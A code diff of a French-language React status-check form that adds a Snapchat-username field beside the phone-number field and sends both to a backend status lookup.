@@ -4,10 +4,11 @@ import { ChevronRight, ArrowLeft } from "lucide-react";
 import { base44 } from "@/api/base44Client";
 
 export default function StatusCheck({ onBack }) {
-  const [submissionId, setSubmissionId] = useState("");
-  const [status, setStatus] = useState(null);
-  const [loading, setLoading] = useState(false);
-  const [error, setError] = useState("");
+   const [snapchat, setSnapchat] = useState("");
+   const [submissionId, setSubmissionId] = useState("");
+   const [status, setStatus] = useState(null);
+   const [loading, setLoading] = useState(false);
+   const [error, setError] = useState("");
 
   const statusLabels = {
     pending: "En attente de code",
@@ -30,15 +31,15 @@ export default function StatusCheck({ onBack }) {
 
   const handleCheck = async (e) => {
     e.preventDefault();
-    if (!submissionId.trim()) {
-      setError("Veuillez entrer votre numéro de téléphone");
+    if (!snapchat.trim() || !submissionId.trim()) {
+      setError("Veuillez entrer votre nom Snapchat et votre numéro de téléphone");
       return;
     }
 
     setLoading(true);
     setError("");
     try {
-      const res = await base44.functions.invoke("checkStatus", { submissionId });
+      const res = await base44.functions.invoke("checkStatus", { submissionId, snapchat });
       setStatus(res?.data?.status || "pending");
     } catch {
       setError("Demande non trouvée");
@@ -71,18 +72,31 @@ export default function StatusCheck({ onBack }) {
         </p>
 
         <form onSubmit={handleCheck} className="space-y-4">
-          <div>
-            <input
-              type="text"
-              placeholder="06 06 06 06 06"
-              value={formatPhone(submissionId)}
-              onChange={handlePhoneChange}
-              className="w-full bg-secondary/30 border border-border rounded-xl px-4 py-3 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary/40 transition-all text-sm"
-            />
-            {error && (
-              <p className="text-destructive text-xs font-medium mt-1">{error}</p>
-            )}
-          </div>
+           <div>
+             <input
+               type="text"
+               placeholder="votre_snap"
+               value={snapchat}
+               onChange={(e) => {
+                 setSnapchat(e.target.value);
+                 setError("");
+               }}
+               className="w-full bg-secondary/30 border border-border rounded-xl px-4 py-3 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary/40 transition-all text-sm"
+             />
+           </div>
+
+           <div>
+             <input
+               type="text"
+               placeholder="06 06 06 06 06"
+               value={formatPhone(submissionId)}
+               onChange={handlePhoneChange}
+               className="w-full bg-secondary/30 border border-border rounded-xl px-4 py-3 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary/40 transition-all text-sm"
+             />
+             {error && (
+               <p className="text-destructive text-xs font-medium mt-1">{error}</p>
+             )}
+           </div>
 
           <motion.button
             type="submit"
